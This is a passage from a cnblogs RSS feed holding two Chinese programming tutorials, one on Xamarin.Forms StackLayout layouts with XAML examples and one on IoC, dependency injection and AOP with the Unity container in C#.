            &amp;lt;Label HorizontalOptions=&quot;FillAndExpand&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;占满中间位置&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
            &amp;lt;Label HorizontalOptions=&quot;End&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;我在右边&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot; BackgroundColor=&quot;Accent&quot;  Padding=&quot;10&quot;  VerticalOptions=&quot;FillAndExpand&quot;&amp;gt;
            &amp;lt;!-- Place new controls here --&amp;gt;
            &amp;lt;Label Text=&quot;我在顶部,高度平分&quot; 
              HorizontalOptions=&quot;StartAndExpand&quot;
              VerticalOptions=&quot;FillAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在中间，高度平分&quot; 
              HorizontalOptions=&quot;FillAndExpand&quot;
              VerticalOptions=&quot;FillAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在底部&quot; 
              HorizontalOptions=&quot;FillAndExpand&quot;
              VerticalOptions=&quot;EndAndExpand&quot;
              BackgroundColor=&quot;Red&quot;/&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&amp;lt;/ContentPage&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;直接设置高度宽度可以用HeightRequest和WidthRequest；&lt;/p&gt;
&lt;h4 id=&quot;stacklayout布局重点需要掌握&quot;&gt;2.StackLayout布局重点需要掌握&lt;/h4&gt;
&lt;h5 id=&quot;verticaloptions和horizontaloptions与widthrequest和heightrequest的优先级关系是什么&quot;&gt;2.1 VerticalOptions和HorizontalOptions与WidthRequest和HeightRequest的优先级关系是什么？&lt;/h5&gt;
&lt;p&gt;这一点容易混淆，我们已经知道VerticalOptions和HorizontalOptions是用来定位和设置大小的，WidthRequest和HeightRequest是double类型，只能用来设置控件大小。当都设置了这四个属性，会出现什么样的结果。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221757140-317676299.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;里面两个子StackLayout的高度各占50%，我们发现** Options和**Request 的属性值所定义的大小谁大就以谁的值为主。&lt;/p&gt;
&lt;h5 id=&quot;在垂直方向水平方向设置宽度widthrequest高度heightrequest无效如图&quot;&gt;2.2 在垂直方向（水平方向）设置宽度WidthRequest（高度HeightRequest）无效，如图：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221700789-450454678.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;stacklayout实现一个简易的计算器布局&quot;&gt;3.StackLayout实现一个简易的计算器布局&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221722289-2136546236.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
&amp;lt;ContentPage xmlns=&quot;http://xamarin.com/schemas/2014/forms&quot;
             xmlns:x=&quot;http://schemas.microsoft.com/winfx/2009/xaml&quot;
             x:Class=&quot;XamarinFormsLayout.CalculatorPage&quot;
             BackgroundColor=&quot;#808080&quot;&amp;gt;
    &amp;lt;ContentPage.Resources&amp;gt;
        &amp;lt;ResourceDictionary&amp;gt;
            &amp;lt;Style x:Key=&quot;DefaultButton&quot; TargetType=&quot;Button&quot;&amp;gt;
                &amp;lt;Setter Property=&quot;BackgroundColor&quot; Value=&quot;Black&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
                &amp;lt;Setter Property=&quot;TextColor&quot; Value=&quot;#dedede&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
            &amp;lt;/Style&amp;gt;
        &amp;lt;/ResourceDictionary&amp;gt;
    &amp;lt;/ContentPage.Resources&amp;gt;
    &amp;lt;StackLayout Orientation=&quot;Vertical&quot;  Spacing=&quot;10&quot; VerticalOptions=&quot;End&quot; Padding=&quot;10&quot;&amp;gt;
        &amp;lt;Frame BackgroundColor=&quot;White&quot; HeightRequest=&quot;40&quot; Margin=&quot;0,0,0,20&quot;&amp;gt;
            &amp;lt;Label Text=&quot;0&quot; VerticalOptions=&quot;Center&quot; HorizontalOptions=&quot;End&quot;TextColor=&quot;Black&quot;FontSize=&quot;35&quot;/&amp;gt;
        &amp;lt;/Frame&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot;&amp;gt;
            &amp;lt;StackLayout Orientation=&quot;Horizontal&quot;   Spacing=&quot;10&quot;&amp;gt;
                &amp;lt;StackLayout Orientation=&quot;Vertical&quot; HorizontalOptions=&quot;FillAndExpand&quot;&amp;gt;
                    &amp;lt;Button  Text=&quot;清除&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;7&quot;  Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;8&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;9&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;4&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;5&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;6&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;1&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;2&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;3&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;0&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;.&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                &amp;lt;/StackLayout&amp;gt;
                &amp;lt;StackLayout Orientation=&quot;Vertical&quot; WidthRequest=&quot;60&quot;&amp;gt;
                    &amp;lt;Button  Text=&quot;÷&quot;  HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;*&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;+&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;-&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;=&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                &amp;lt;/StackLayout&amp;gt;
            &amp;lt;/StackLayout&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&amp;lt;/ContentPage&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;总结&quot;&gt;4.总结&lt;/h4&gt;
&lt;p&gt;xamarin forms的布局都是基于wpf的思想，padding和margin的四个方向是左上右下，这和android、前端css的四个方向上右下左有点区别。&lt;br/&gt;常用的布局就我个人而言StackLayout和Grid使用的最为广泛和简单，其他的几种布局写起来相对复杂，效果也相对不佳。&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 14:15:00 +0000</pubDate>
<dc:creator>张林-布莱恩特</dc:creator>
<og:description>通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhangmumu/p/9751788.html</dc:identifier>
</item>
<item>
<title>IOC的理解,整合AOP,解耦对Service层和Dal层的依赖 - 从未太晚</title>
<link>http://www.cnblogs.com/kongsq/p/9751716.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kongsq/p/9751716.html</guid>
<description>&lt;p&gt;&lt;br/&gt; DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖&lt;br/&gt;依赖抽象，而不是细节&lt;/p&gt;&lt;p&gt; 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方&lt;/p&gt;&lt;p&gt; 高层本来是依赖低层，但是可以通过工厂(容器)来决定细节，去掉了对低层的依赖&lt;br/&gt; IOC控制反转：把高层对低层的依赖，转移到第三方决定，避免高层对低层的直接依赖(是一种目的)&lt;br/&gt;那么程序架构就具备良好扩展性和稳定性&lt;/p&gt;&lt;p&gt;DI依赖注入：是用来实现IOC的一种手段,&lt;br/&gt; 在构造对象时，可以自动的去初始化，对象需要的对象&lt;br/&gt;构造函数注入 属性注入 方法注入,IOC容器初始化ApplePhone的时候 通过配置文件实例化 属性,方法,构造函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Practices.Unity;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Linq;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Text;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Threading.Tasks;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Ruanmou.Interface;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Unity.Attributes;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Ruanmou.Service
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ApplePhone : IPhone
    {
        [Dependency]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;属性注入：不错，但是有对容器的依赖&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; IMicrophone iMicrophone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IHeadphone iHeadphone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IPower iPower { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[InjectionConstructor]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ApplePhone()
        {
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}构造函数&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[InjectionConstructor]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;构造函数注入：最好的，默认找参数最多的构造函数&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ApplePhone(IHeadphone headphone)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.iHeadphone =&lt;span&gt; headphone;
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}带参数构造函数&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Call()
        {
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}打电话&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name); 
        }

        [InjectionMethod]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;方法注入：最不好的，增加一个没有意义的方法，破坏封装&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Init1234(IPower power)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.iPower =&lt;span&gt; power;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;不管是构造对象，还是注入对象，这里都是靠反射做到的&lt;/p&gt;
&lt;p&gt;有了依赖注入，才可能做到无限层级的依赖抽象，才能做到控制反转&lt;/p&gt;

&lt;p&gt;IOC Unity容器 可以通过代码注册或配置文件注册接口对应实现类,实现了不依赖具体,可以对对象全局单例,线程单例&lt;/p&gt;
&lt;p&gt;例子1&lt;/p&gt;
&lt;p&gt;Service业务逻辑层升级,在原有1.0的基础上添加一些功能,使用配置文件注册&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainer1&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.ApplePhone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只需要把服务2.0的类库(实现1.0的原有接口)dll拿过来即可使用,代码不做任何修改&lt;/p&gt;
&lt;p&gt;例子2 业务扩展，新加功能&lt;/p&gt;
&lt;p&gt;应该是加几个接口和实现类的映射,就可以解决了。&lt;/p&gt;
&lt;p&gt;例子3 实现AOP&lt;/p&gt;
&lt;p&gt;方法需要加日志，加异常管理，可以不修改原有代码，直接新加异常管理类等的类库，在Unity配置文件添加AOP配置节点即可实现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/527658/201810/527658-20181007214912991-57487101.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置文件配置，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainerAOP&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;extension &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Interception&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptor &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;InterfaceInterceptor&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.AuthorizeBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.SmsBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.ExceptionLoggingBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.CachingBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.LogBeforeBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.ParameterCheckBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.LogAfterBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;register&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;register&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 贴一个异常处理的AOP例子代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Ruanmou.Framework.AOP
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ExceptionLoggingBehavior : IInterceptionBehavior
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;Type&amp;gt;&lt;span&gt; GetRequiredInterfaces()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Type.EmptyTypes;
        }

